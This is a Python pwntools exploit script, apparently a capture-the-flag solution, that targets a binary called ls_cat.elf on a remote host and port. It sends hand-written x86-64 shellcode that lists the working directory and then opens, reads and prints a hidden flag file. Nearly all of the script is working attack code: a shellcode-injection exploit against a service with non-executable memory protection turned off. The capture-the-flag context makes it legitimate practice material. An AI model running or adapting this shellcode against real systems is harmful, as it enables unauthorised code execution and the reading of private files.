#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template ./ls_cat.elf --host 109.233.56.90 --port 11665
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./ls_cat.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11665)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

_open = shellcraft.pushstr(b'./')
_open += """
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
"""

getdents64 = """
    mov rdi, rax
    mov eax, 217
    lea rsi, [rip + need_output]
    mov rdx, 0x1000
    syscall
"""

_write = """
    mov edi, 1
    mov rax, 1
    syscall
need_output:
"""

# first run for read dir -> s3cr3t_f1l3_w1th_fl0g
# shellcode = asm(_open + getdents64 + _write)
# io.sendline(shellcode)

_open = shellcraft.pushstr(b's3cr3t_f1l3_w1th_fl0g')
_open += """
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall
"""

_read = """
    mov rdi, rax
    lea rsi, [rip + need_output]
    mov rdx, 40
    mov rax, 0
    syscall
"""

_write = """
    mov edi, 1
    mov rax, 1
    syscall
need_output:
"""

shellcode = asm(_open + _read + _write)
io.sendline(shellcode)

io.recvuntil("spbctf")
flag = io.recvuntil(b"}").decode()
log.success(f"Flag: spbctf{flag}")

io.close()

